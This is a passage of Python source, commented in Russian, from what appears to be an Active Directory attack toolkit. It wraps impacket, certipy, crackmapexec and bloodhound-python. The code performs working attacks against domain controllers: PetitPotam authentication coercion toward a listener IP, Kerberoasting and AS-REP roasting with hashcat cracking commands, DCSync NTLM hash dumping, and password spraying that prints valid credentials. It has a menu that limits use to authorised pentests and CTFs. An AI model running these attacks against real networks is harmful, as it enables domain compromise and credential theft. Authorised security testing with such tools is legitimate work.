                severity="critical",
                title=f"Zerologon (CVE-2020-1472) suspected on {dc}",
                target=dc,
                evidence="Netlogon RPC handshake не отклонён",
                data=result,
            ))
        else:
            console.print("[green]✓ Zerologon не подтверждён.[/green]")
    except Exception as exc:  # noqa: BLE001
        console.print(f"[yellow]Проверка не завершена: {exc}[/yellow]")
        result["error"] = str(exc)[:200]

    db.save_scan("ad_zerologon", dc, result)
    return result


# ===========================================================================
# PetitPotam / PrinterBug
# ===========================================================================

def check_petitpotam(dc: str, listener_ip: str = "",
                     user: str = "", password: str = "",
                     domain: str = "") -> dict:
    """PetitPotam (EfsRpcOpenFileRaw) + PrinterBug детект."""
    console.print(f"[cyan]🔍 PetitPotam / PrinterBug: {dc}[/cyan]")
    result: dict = {"dc": dc, "efsrpc_open": False, "spooler_open": False}

    # Проверка open ports на EFSRPC (обычно через 445) + MS-RPRN
    # Точная проверка требует вызова RPC; реализуем базово
    # ======== PetitPotam ========
    if not listener_ip:
        listener_ip = Prompt.ask("Listener IP (для callback)",
                                  default="127.0.0.1")
    try:
        from impacket.dcerpc.v5 import transport, efsr
    except ImportError:
        console.print("[yellow]impacket не установлен — "
                      "проверка ограничена.[/yellow]")
    else:
        try:
            string_binding = rf"ncacn_np:{dc}[\pipe\lsarpc]"
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_credentials(user, password, domain)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(efsr.MSRPC_UUID_EFSR)
            # Пробуем открыть \\listener_ip\share\null
            # (если сервер отвечает на вызов — потенциально уязвим)
            try:
                efsr.hEfsRpcOpenFileRaw(
                    dce,
                    rf"\\{listener_ip}\share\test",
                    0,
                )
                result["efsrpc_open"] = True
            except Exception as e:
                err_str = str(e).lower()
                # Если исключение = "access denied" — endpoint жив, вызов дошёл
                if "access" in err_str or "rpc_s" in err_str or \
                   "efsr" in err_str or "null" in err_str:
                    result["efsrpc_open"] = True
            dce.disconnect()
        except Exception as exc:  # noqa: BLE001
            log.debug("petitpotam: %s", exc)

    # ======== PrinterBug ========
    try:
        from impacket.dcerpc.v5 import transport, rprn
    except ImportError:
        pass
    else:
        try:
            string_binding = rf"ncacn_np:{dc}[\pipe\spoolss]"
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_credentials(user, password, domain)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)
            result["spooler_open"] = True
            dce.disconnect()
        except Exception as exc:  # noqa: BLE001
            log.debug("printerbug: %s", exc)

    t = Table(title="PetitPotam / PrinterBug")
    t.add_column("Проверка", style="cyan")
    t.add_column("Результат", style="green")
    t.add_row("EFSRPC (PetitPotam)",
              "[red]возможно уязвим[/red]" if result["efsrpc_open"]
              else "[dim]не подтверждено[/dim]")
    t.add_row("Spooler (PrinterBug)",
              "[yellow]spooler доступен[/yellow]" if result["spooler_open"]
              else "[green]закрыт[/green]")
    console.print(t)

    if result["efsrpc_open"]:
        _save_finding(ADFinding(
            kind="petitpotam",
            severity="high",
            title=f"PetitPotam potential on {dc}",
            target=dc,
            evidence="EFSRPC отвечает на вызовы",
            data=result,
        ))
    if result["spooler_open"]:
        _save_finding(ADFinding(
            kind="printerbug",
            severity="medium",
            title=f"Print Spooler service accessible on {dc}",
            target=dc,
            evidence="spoolss pipe доступен",
            data=result,
        ))

    db.save_scan("ad_petitpotam", dc, result)
    return result


# ===========================================================================
# ADCS enumeration (certipy)
# ===========================================================================

def check_adcs(dc: str, domain: str, user: str, password: str) -> dict:
    """ADCS enumeration через certipy."""
    console.print(f"[cyan]🔍 ADCS enumeration: {domain}[/cyan]")
    result: dict = {"dc": dc, "vulnerable": []}

    if not shutil.which("certipy"):
        console.print("[yellow]certipy не установлен. "
                      "pip install certipy-ad[/yellow]")
        return result

    cmd = ["certipy", "find", "-u", f"{user}@{domain}", "-p", password,
           "-dc-ip", dc, "-vulnerable", "-stdout"]
    rc, out, err = _run(cmd, timeout=90)
    text = out + err
    console.print(f"[dim]{text[:1500]}[/dim]")

    # Ищем ESC1..ESC8
    escs = re.findall(r"(ESC\d+)", text)
    if escs:
        result["vulnerable"] = sorted(set(escs))
        console.print(f"[red]⚠ Найдено: {', '.join(result['vulnerable'])}"
                      f"[/red]")
        _save_finding(ADFinding(
            kind="adcs_vulnerable",
            severity="critical",
            title=f"ADCS vulnerabilities: "
                  f"{', '.join(result['vulnerable'])}",
            target=dc,
            evidence=text[:2000],
            data=result,
        ))
    else:
        console.print("[green]✓ Уязвимых шаблонов не найдено.[/green]")

    db.save_scan("ad_adcs", domain, result)
    return result


# ===========================================================================
# Kerberoasting (impacket)
# ===========================================================================

def kerberoast(domain: str, dc: str, user: str,
               password: str = "", nthash: str = "",
               output_file: str | None = None) -> Path | None:
    """Запустить impacket-GetUserSPNs."""
    if not shutil.which("impacket-GetUserSPNs"):
        console.print("[red]impacket-GetUserSPNs не установлен.[/red]")
        console.print("[yellow]pip install impacket[/yellow]")
        return None

    if not output_file:
        output_file = str(AD_DIR /
                          f"kerb_{domain}_{datetime.now():%Y%m%d_%H%M%S}.txt")
    out_file = Path(output_file)

    target = f"{domain}/{user}"
    if password and not nthash:
        target = f"{domain}/{user}:{password}"

    cmd = ["impacket-GetUserSPNs", target, "-dc-ip", dc,
           "-request", "-outputfile", str(out_file)]
    if nthash:
        cmd += ["-hashes", f":{nthash}"]

    console.print(f"[cyan]$ {' '.join(cmd)}[/cyan]\n")
    rc, out, err = _run(cmd, timeout=120)
    if out:
        console.print(f"[dim]{out[:2000]}[/dim]")

    if out_file.exists() and out_file.stat().st_size > 0:
        console.print(f"[green]✓ Сохранено: {out_file}[/green]")
        console.print(f"[cyan]Crack: hashcat -m 13100 {out_file} "
                      f"wordlist.txt[/cyan]")
        _save_finding(ADFinding(
            kind="kerberoast",
            severity="high",
            title=f"Kerberoasting: hashes captured from {domain}",
            target=dc,
            evidence=f"File: {out_file}",
            data={"file": str(out_file)},
        ))
        db.save_scan("ad_kerberoast", domain, {"file": str(out_file)})
        return out_file
    else:
        console.print("[yellow]Hashes не получены (нет SPN или "
                      "ошибка).[yellow]")
    return None


# ===========================================================================
# AS-REP Roasting (impacket)
# ===========================================================================

def asrep_roast(domain: str, dc: str,
                users_file: str | None = None,
                user: str = "", password: str = "",
                output_file: str | None = None) -> Path | None:
    """impacket-GetNPUsers."""
    if not shutil.which("impacket-GetNPUsers"):
        console.print("[red]impacket-GetNPUsers не установлен.[/red]")
        return None

    if not output_file:
        output_file = str(AD_DIR /
                          f"asrep_{domain}_{datetime.now():%Y%m%d_%H%M%S}.txt")
    out_file = Path(output_file)

    if users_file and Path(users_file).exists():
        target = f"{domain}/"
        cmd = ["impacket-GetNPUsers", target,
               "-usersfile", users_file, "-dc-ip", dc,
               "-format", "hashcat",
               "-outputfile", str(out_file)]
    elif user and password:
        target = f"{domain}/{user}:{password}"
        cmd = ["impacket-GetNPUsers", target, "-dc-ip", dc,
               "-request", "-format", "hashcat",
               "-outputfile", str(out_file)]
    else:
        console.print("[red]Нужен users_file ИЛИ user+password.[/red]")
        return None

    console.print(f"[cyan]$ {' '.join(cmd)}[/cyan]\n")
    rc, out, err = _run(cmd, timeout=90)
    if out:
        console.print(f"[dim]{out[:2000]}[/dim]")

    if out_file.exists() and out_file.stat().st_size > 0:
        console.print(f"[green]✓ Сохранено: {out_file}[/green]")
        console.print(f"[cyan]Crack: hashcat -m 18200 {out_file} "
                      f"wordlist.txt[/cyan]")
        _save_finding(ADFinding(
            kind="asrep_roast",
            severity="high",
            title=f"AS-REP Roasting: hashes captured from {domain}",
            target=dc,
            evidence=f"File: {out_file}",
            data={"file": str(out_file)},
        ))
        db.save_scan("ad_asrep", domain, {"file": str(out_file)})
        return out_file
    return None


# ===========================================================================
# DCSync
# ===========================================================================

def dcsync(domain: str, dc: str, user: str, password: str = "",
           nthash: str = "", target_user: str = "",
           output_file: str | None = None) -> None:
    """impacket-secretsdump."""
    if not shutil.which("impacket-secretsdump"):
        console.print("[red]impacket-secretsdump не установлен.[/red]")
        return

    if not output_file:
        output_file = str(AD_DIR /
                          f"dcsync_{domain}_{datetime.now():%Y%m%d_%H%M%S}")
    out_file = output_file

    target = f"{domain}/{user}"
    if password and not nthash:
        target += f":{password}"
    target += f"@{dc}"

    cmd = ["impacket-secretsdump", target,
           "-just-dc-ntlm", "-outputfile", out_file]
    if nthash:
        cmd += ["-hashes", f":{nthash}"]
    if target_user:
        cmd += ["-just-dc-user", target_user]

    console.print(f"[cyan]$ {' '.join(cmd)}[/cyan]\n")
    rc, out, err = _run(cmd, timeout=180)
    if out:
        console.print(f"[dim]{out[:3000]}[/dim]")
    if Path(out_file + ".ntds").exists():
        console.print(f"[red]⚠ DCSync успешен: {out_file}.ntds[/red]")
        _save_finding(ADFinding(
            kind="dcsync",
            severity="critical",
            title=f"DCSync successful on {domain}",
            target=dc,
            evidence=f"Сохранено в {out_file}.ntds",
            data={"file": out_file + ".ntds"},
        ))
    db.save_scan("ad_dcsync", domain, {"user": user, "target": target_user})


# ===========================================================================
# Password spray (с защитой от lockout)
# ===========================================================================

def password_spray(domain: str, dc: str, users_file: str,
                   password: str, lockout_threshold: int = 0,
                   delay_sec: float = 2.0,
                   protocol: str = "smb") -> dict:
    """
    Password spray через cme/nxc.
    Защита: если lockout_threshold задан — ограничим количество попыток.
    """
    cme = _which_any("crackmapexec", "nxc", "netexec")
    if not cme:
        console.print("[red]crackmapexec/nxc не установлен.[/red]")
        return {"error": "cme not installed"}

    if not Path(users_file).exists():
        console.print(f"[red]Файл {users_file} не найден.[/red]")
        return {"error": "users file not found"}

    # Считаем пользователей
    try:
        users = [l.strip() for l in Path(users_file).read_text(
            encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    except Exception:
        users = []
    n = len(users)
    if n == 0:
        console.print("[red]Файл пользователей пуст.[/red]")
        return {"error": "empty users file"}

    console.print(f"[yellow]⚠ Spray '{password}' по {dc} "
                  f"(users={n}, protocol={protocol})[/yellow]")
    if lockout_threshold:
        console.print(f"[yellow]Lockout threshold={lockout_threshold}, "
                      f"попыток на пользователя будет ≤ 1[/yellow]")
    if not Confirm.ask("Запустить?", default=False):
        return {"cancelled": True}

    cmd = [cme, protocol, dc,
           "-u", users_file, "-p", password,
           "--continue-on-success"]
    if delay_sec > 0:
        # Имитация задержки через последовательный запуск
        # (cme сам не поддерживает per-user delay, поэтому просто ждём между
        # — если бы был per-user, но здесь общий запуск)
        pass

    rc, out, err = _run(cmd, timeout=180)
    text = out + err
    console.print(f"[dim]{text[:3000]}[/dim]")

    # Парсим успешные
    valid = re.findall(r"\[\+\]\s+(\S+):(\S+)\s+(\S+)", text)
    if valid:
        console.print(f"[bold green]✓ Валидные креды: {len(valid)}[/bold green]")
        for u, p, _ in valid[:20]:
            console.print(f"  [green]{u}:{p}[/green]")
        _save_finding(ADFinding(
            kind="password_spray_success",
            severity="critical",
            title=f"Password spray: {len(valid)} valid credentials",
            target=dc,
            evidence="\n".join(f"{u}:{p}" for u, p, _ in valid[:10]),
            data={"count": len(valid)},
        ))
    else:
        console.print("[yellow]Валидных креденшелов не найдено.[/yellow]")

    db.save_scan("ad_spray", domain, {
        "password_len": len(password),
        "valid_count": len(valid),
    })
    return {"valid": valid, "output": text[:2000]}


# ===========================================================================
# BloodHound collect
# ===========================================================================

def bloodhound_collect(domain: str, dc: str, user: str,
                       password: str = "", nthash: str = "") -> Path | None:
    """bloodhound-python."""
    if not shutil.which("bloodhound-python"):
        console.print("[red]bloodhound-python не установлен.[/red]")
        return None

    out_dir = AD_DIR / f"bh_{domain}_{datetime.now():%Y%m%d_%H%M%S}"
    out_dir.mkdir(exist_ok=True)

    cmd = ["bloodhound-python",
           "-d", domain, "-u", user, "-ns", dc, "-c", "All",
           "-o", str(out_dir)]
    if nthash:
        cmd += ["--hashes", f":{nthash}"]
    elif password:
        cmd += ["-p", password]

    console.print(f"[cyan]$ {' '.join(cmd)}[/cyan]\n")
    rc, out, err = _run(cmd, timeout=300)
    if out:
        console.print(f"[dim]{out[:2000]}[/dim]")
    console.print(f"[green]✓ Загрузи .zip/json из {out_dir} в BloodHound GUI"
                  f"[/green]")
    db.save_scan("ad_bloodhound", domain, {"dir": str(out_dir)})
    return out_dir


# ===========================================================================
# Trust enumeration
# ===========================================================================

def enum_trusts(dc: str, domain: str,
                user: str = "", password: str = "") -> list[str]:
    """Domain trusts через ldapsearch."""
    console.print(f"[cyan]🔍 Domain trusts: {domain}[/cyan]")
    if not shutil.which("ldapsearch"):
        return []

    base_dn = "DC=" + ",DC=".join(p.lower() for p in domain.lower().split("."))
    bind = []
    if user and password:
        bind = ["-D", f"{user}@{domain}", "-w", password]

    cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc}", *bind,
           "-b", f"CN=System,{base_dn}",
           "(objectClass=trustedDomain)",
           "trustPartner", "trustDirection", "trustType"]
    rc, out, _ = _run(cmd, timeout=20)
    partners = sorted(set(re.findall(r"trustPartner:\s*(\S+)", out)))
    if partners:
        console.print(f"[yellow]Trusts: {len(partners)}[/yellow]")
        for p in partners:
            console.print(f"  [cyan]{p}[/cyan]")
    else:
        console.print("[green]✓ Trusts не найдено.[/green]")
    db.save_scan("ad_trusts", domain, partners)
    return partners


# ===========================================================================
# Full audit (один вызов — всё сразу)
# ===========================================================================

def full_audit(dc: str, domain: str,
               user: str = "", password: str = "") -> dict:
    """Полный аудит AD: SMB / LDAP / null / policy / delegation."""
    console.print(f"\n[bold cyan]═══ AD Full Audit: {domain} ═══[/bold cyan]\n")

    result: dict[str, Any] = {
        "dc": dc, "domain": domain, "ts": datetime.now().isoformat(),
    }

    result["smb_signing"] = check_smb_signing(dc)
    result["ldap_anon"] = check_ldap_anonymous(dc)
    result["null_session"] = check_null_session(dc)
    result["password_policy"] = check_password_policy(dc, domain, user, password)

    if user and password:
        result["kerberoastable"] = enum_kerberoastable(dc, domain, user, password)
        result["asrep_roastable"] = enum_asrep(dc, domain, user, password)
        result["delegation"] = enum_delegation(dc, domain, user, password)
        result["trusts"] = enum_trusts(dc, domain, user, password)

    # Сохранение отчёта
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = AD_DIR / f"audit_{domain.replace('.', '_')}_{ts}.json"
    try:
        out.write_text(
            json.dumps(result, indent=2, ensure_ascii=False, default=str),
            encoding="utf-8",
        )
        console.print(f"\n[green]✓ Отчёт: {out}[/green]")
    except Exception as exc:  # noqa: BLE001
        log.warning("save: %s", exc)

    # Notify
    try:
        from modules import notifier
        notifier.notify_all(
            f"🏢 AD Audit: {domain}",
            f"DC: {dc}\nKerberoastable: "
            f"{len(result.get('kerberoastable', []))}\n"
            f"AS-REP: {len(result.get('asrep_roastable', []))}",
        )
    except Exception:
        pass

    db.save_scan("ad_full_audit", domain, {
        "dc": dc,
        "smb_signing": result["smb_signing"].get("signing_required"),
        "ldap_anon": result["ldap_anon"].get("anonymous_bind"),
        "null_session": result["null_session"].get("null_session"),
    })
    return result


# ===========================================================================
# CLI-обёртки (сохраняю старые имена)
# ===========================================================================

def cli_tools() -> None:
    _print_tools()


def cli_cheatsheets() -> None:
    table = Table(title="📚 AD Cheat-sheets")
    table.add_column("Key", style="cyan")
    table.add_column("Title", style="white")
    for key, sheet in CHEATSHEETS.items():
        table.add_row(key, sheet["title"])
    console.print(table)


def cli_cheat(name: str) -> None:
    show_cheatsheet(name)


def cli_smb_signing(dc: str) -> None:
    check_smb_signing(dc)


def cli_ldap_anon(dc: str) -> None:
    check_ldap_anonymous(dc)


def cli_null_session(dc: str) -> None:
    check_null_session(dc)


# ===========================================================================
# Меню (расширенное)
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🏢 Active Directory Attack Suite[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Проверить инструменты"),
        ("2", "Список cheat-sheets"),
        ("3", "Cheat-sheet (по имени)"),
        ("4", "── Live enumeration ──"),
        ("5", "SMB signing check"),
        ("6", "LDAP anonymous bind check"),
        ("7", "SMB NULL session check"),
        ("8", "Password policy (lockout threshold)"),
        ("9", "Kerberoastable users (LDAP)"),
        ("10", "AS-REP roastable users (LDAP)"),
        ("11", "Unconstrained/Constrained Delegation"),
        ("12", "ADCS (ESC1-ESC8) enumeration"),
        ("13", "Domain trusts enumeration"),
        ("14", "Zerologon (CVE-2020-1472) check"),
        ("15", "PetitPotam / PrinterBug check"),
        ("16", "── Атаки ──"),
        ("17", "Kerberoasting (impacket)"),
        ("18", "AS-REP Roast (impacket)"),
        ("19", "DCSync (secretsdump)"),
        ("20", "Password spray (cme/nxc)"),
        ("21", "GPP cpassword search (SYSVOL)"),
        ("22", "BloodHound collect"),
        ("23", "── Комбо ──"),
        ("24", "Full audit (все проверки)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста / CTF.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        _print_tools()
    elif c == "2":
        cli_cheatsheets()
    elif c == "3":
        name = Prompt.ask("Cheat-sheet",
                          choices=list(CHEATSHEETS.keys()),
                          default="ldap-enum")
        dc = Prompt.ask("DC", default="dc.domain.local")
        dom = Prompt.ask("Домен", default="DOMAIN.LOCAL")
        user = Prompt.ask("User", default="user")
        pwd = Prompt.ask("Password", default="Passw0rd!")
        show_cheatsheet(name, dc, dom, user, pwd)
    elif c == "4":
        console.print("[dim]Выбери пункты 5-15 ниже[/dim]")
    elif c == "5":
        check_smb_signing(Prompt.ask("DC"))
    elif c == "6":
        check_ldap_anonymous(Prompt.ask("DC"))
    elif c == "7":
        check_null_session(Prompt.ask("DC"))
    elif c == "8":
        dc = Prompt.ask("DC")
        dom = Prompt.ask("Домен")
        u = Prompt.ask("User (опц.)", default="")
        p = Prompt.ask("Password (опц.)", default="", password=True) if u else ""
        check_password_policy(dc, dom, u, p)
    elif c == "9":
        dc = Prompt.ask("DC"); dom = Prompt.ask("Домен")
        u = Prompt.ask("User (опц.)", default="")
        p = Prompt.ask("Password (опц.)", default="", password=True) if u else ""
        enum_kerberoastable(dc, dom, u, p)
    elif c == "10":
        dc = Prompt.ask("DC"); dom = Prompt.ask("Домен")
        u = Prompt.ask("User (опц.)", default="")
        p = Prompt.ask("Password (опц.)", default="", password=True) if u else ""
        enum_asrep(dc, dom, u, p)
    elif c == "11":
        dc = Prompt.ask("DC"); dom = Prompt.ask("Домен")
        u = Prompt.ask("User"); p = Prompt.ask("Password", password=True)
        enum_delegation(dc, dom, u, p)
    elif c == "12":
        dc = Prompt.ask("DC"); dom = Prompt.ask("Домен")
        u = Prompt.ask("User"); p = Prompt.ask("Password", password=True)
        check_adcs(dc, dom, u, p)
    elif c == "13":
        dc = Prompt.ask("DC"); dom = Prompt.ask("Домен")
        u = Prompt.ask("User (опц.)", default="")
        p = Prompt.ask("Password (опц.)", default="", password=True) if u else ""
        enum_trusts(dc, dom, u, p)
    elif c == "14":
        dc = Prompt.ask("DC")
        ip = Prompt.ask("DC IP (пусто = DNS)", default="")
        check_zerologon(dc, ip)
    elif c == "15":
        dc = Prompt.ask("DC")
        listener = Prompt.ask("Listener IP (наш)", default="127.0.0.1")
        dom = Prompt.ask("Домен (опц.)", default="")
        u = Prompt.ask("User (опц.)", default="")
        p = Prompt.ask("Password (опц.)", default="", password=True) if u else ""
        check_petitpotam(dc, listener, u, p, dom)
    elif c == "16":
        console.print("[dim]Выбери пункты 17-22 ниже[/dim]")
    elif c == "17":
        dom = Prompt.ask("Домен"); dc = Prompt.ask("DC IP")
        u = Prompt.ask("User")
        p = Prompt.ask("Password (пусто для NThash)", default="")
        nh = "" if p else Prompt.ask("NThash", default="")
        kerberoast(dom, dc, u, p, nh)
    elif c == "18":
        dom = Prompt.ask("Домен"); dc = Prompt.ask("DC IP")
        uf = Prompt.ask("Users file (пусто для user+pass)", default="")
        u = p = ""
        if not uf:
            u = Prompt.ask("User"); p = Prompt.ask("Password", password=True)
        asrep_roast(dom, dc, uf or None, u, p)
    elif c == "19":
        dom = Prompt.ask("Домен"); dc = Prompt.ask("DC IP")
        u = Prompt.ask("User"); p = Prompt.ask("Password", password=True)
        tu = Prompt.ask("Target user (пусто = все)", default="")
        dcsync(dom, dc, u, p, target_user=tu)
    elif c == "20":
        dom = Prompt.ask("Домен"); dc = Prompt.ask("DC IP")
        uf = Prompt.ask("Users file")
        p = Prompt.ask("Password")
        lockout = IntPrompt.ask("Lockout threshold (0 = не знаю)",
                                 default=0)
        password_spray(dom, dc, uf, p, lockout_threshold=lockout)
    elif c == "21":
        dc = Prompt.ask("DC"); dom = Prompt.ask("Домен")
        u = Prompt.ask("User"); p = Prompt.ask("Password", password=True)
        check_gpp_passwords(dc, dom, u, p)
    elif c == "22":
        dom = Prompt.ask("Домен"); dc = Prompt.ask("DC IP")
        u = Prompt.ask("User")
        p = Prompt.ask("Password (пусто для NThash)", default="")
        nh = "" if p else Prompt.ask("NThash", default="")
        bloodhound_collect(dom, dc, u, p, nh)
    elif c == "23":
        console.print("[dim]Пункт 24 — полный аудит[/dim]")
    elif c == "24":
        dc = Prompt.ask("DC"); dom = Prompt.ask("Домен")
        u = Prompt.ask("User (опц.)", default="")
        p = Prompt.ask("Password (опц.)", default="", password=True) if u else ""
        full_audit(dc, dom, u, p)